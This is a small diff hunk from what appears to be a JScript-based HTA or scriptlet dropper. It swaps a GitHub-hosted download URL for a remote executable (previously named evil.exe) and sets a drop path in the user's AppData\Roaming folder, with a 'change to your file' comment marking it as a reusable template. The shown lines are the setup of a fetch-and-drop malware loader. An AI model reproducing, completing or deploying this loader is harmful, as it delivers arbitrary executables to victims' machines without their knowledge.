@@ -5,7 +5,7 @@
     classid="{00000000-0000-0000-0000-000000000000}">
     <script language="JScript">
     <![CDATA[
-        var url = "https://raw.githubusercontent.com/beefybiscuit911/zimbirt/main/evil.exe";   // change to your file
+        var url = "https://github.com/beefybiscuit911/zimbirt/raw/refs/heads/main/ConsoleApplication2.exe";   // change to your file
         var localPath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\evil.exe";
 
         // Expand environment variable (like %USERNAME%)
